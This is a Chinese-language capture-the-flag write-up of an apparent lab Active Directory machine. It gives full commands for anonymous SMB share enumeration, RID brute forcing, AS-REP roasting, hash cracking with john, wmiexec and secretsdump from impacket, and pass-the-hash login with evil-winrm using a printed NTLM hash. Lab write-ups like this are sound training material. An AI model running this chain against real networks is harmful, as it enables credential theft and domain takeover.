# Write Up

- 先Nmap

![](https://hackmd.io/_uploads/Sk9Y4m1j3.png)

- 有開139、445 port，看來目標是個AD

- 首先Rec階段要先了解分享多少目錄、以及有可能的透漏帳號
    - `smbclient -L //10.10.10.108 -N`

![](https://hackmd.io/_uploads/S1rVFm1jn.png)

- 發現有VulnNet-Business-Anonymous、VulnNet-Enterprise-Anonymous兩個資料夾有分享，

- 接續顯示資料夾權限
    - `smbmap -u anonymous -H IP`
    - `crackmapexec smb 10.10.10.108 -u anonymous -p "" --shares`

![](https://hackmd.io/_uploads/S1Tkc7Joh.png)

![](https://hackmd.io/_uploads/Sys59Xkoh.png)

- 接下來做了幾個嘗試
    - 1.枚舉username
        - `crackmapexec smb 10.10.10.108 -u 'guest' -p '' --rid-brute`
        - `python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.39.158`
    
    ![](https://hackmd.io/_uploads/Sy2qNN1sh.png)

    - 2.用crackmapexec的spider_plus模組嘗試閱覽共享資料夾下的文件
        - `crackmapexec smb 10.10.10.108 -u 'guest' -p "" -M spider_plus
    
    ![](https://hackmd.io/_uploads/HJtLUEysn.png)
    

- 在確認用戶與共享資料夾的文件後，使用smbclient進行下載
    - `smbclient //10.10.1.123/VulnNet-Enterprise-Anonymous -N`
    - `smbclient //10.10.1.123/VulnNet-Business-Anonymous -N`

![](https://hackmd.io/_uploads/B1B6wE1j3.png)

- 打開6個檔案後發現有幾個Users，可以跟枚舉用戶雷同

![](https://hackmd.io/_uploads/r1ZtspVb6.png)

- using ASREPRoast 執行密碼噴灑
    - `impacket-GetNPUsers 'VULNNET-RST/' -usersfile username.txt -no-pass -dc-ip 10.10.38.45`

![](https://hackmd.io/_uploads/rkzsC64Wa.png)

- 從結果看到，有user跟password hash噴出來

- 開始破解hash值
    - `john hash.txt --wordlist=/home/kali/Desktop/rockyou.txt`

![](https://hackmd.io/_uploads/HykevwSWT.png)

- 這樣我們已經確定t-skid帳號與密碼，重新使用smb登入
    - `smbclient  -U t-skid \\\\10.10.39.158\\NETLOGON`

![](https://hackmd.io/_uploads/rJAoFwSbp.png)

- 發現一個ResetPassword.vbs檔案，查了一下應該是VB的腳本，看了一下code後

![](https://hackmd.io/_uploads/ryuT9vr-6.png)

- 好笑ㄌ，發現另一組帳密

- 使用wmiexec執行shell
    - `python3 /usr/share/doc/python3-impacket/examples/wmiexec.py vulnnet-rst.local/a-whitehat@10.10.39.158`

![](https://hackmd.io/_uploads/BkYvyOBba.png)

- 進去後開始找user.txt

![](https://hackmd.io/_uploads/HyRYl_SWp.png)

- 接下來要開始secretdump administrator
    - `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat@10.10.39.158`

![](https://hackmd.io/_uploads/BJ7ymOSWT.png)

- 使用evil-winrm 進行shell
    - `evil-winrm -i 10.10.39.47 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
`

![](https://hackmd.io/_uploads/S1QfjuHWp.png)

- 之後進入Desktop 找flag

![](https://hackmd.io/_uploads/H10BsuHZT.png)







